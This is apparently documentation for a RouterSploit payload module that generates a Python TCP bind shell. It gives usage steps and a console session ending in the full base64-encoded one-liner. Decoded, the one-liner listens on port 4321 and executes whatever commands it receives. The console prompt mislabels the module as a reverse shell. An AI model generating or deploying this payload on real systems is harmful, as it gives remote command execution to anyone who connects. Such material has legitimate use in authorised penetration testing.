## Description

Module generates payload that creates interactive tcp bind shell by using python one-liner. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/cmd/python_bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates python tcp bind shell payload

## Scenarios

```
rsf > use payloads/cmd/python_bind_tcp
rsf (Python Reverse TCP One-Liner) > set rport 4321
[+] rport => 4321
rsf (Python Reverse TCP One-Liner) > run
[*] Running module...
[*] Generating payload
python -c "exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJzAuMC4wLjAnLDQzMjEpKQpzby5saXN0ZW4oMSkKc28sYWRkcj1zby5hY2NlcHQoKQp4PUZhbHNlCndoaWxlIG5vdCB4OgoJZGF0YT1zby5yZWN2KDEwMjQpCglzdGRpbixzdGRvdXQsc3RkZXJyLD1vcy5wb3BlbjMoZGF0YSkKCXN0ZG91dF92YWx1ZT1zdGRvdXQucmVhZCgpK3N0ZGVyci5yZWFkKCkKCXNvLnNlbmQoc3Rkb3V0X3ZhbHVlKQo='.decode('base64'))"
```
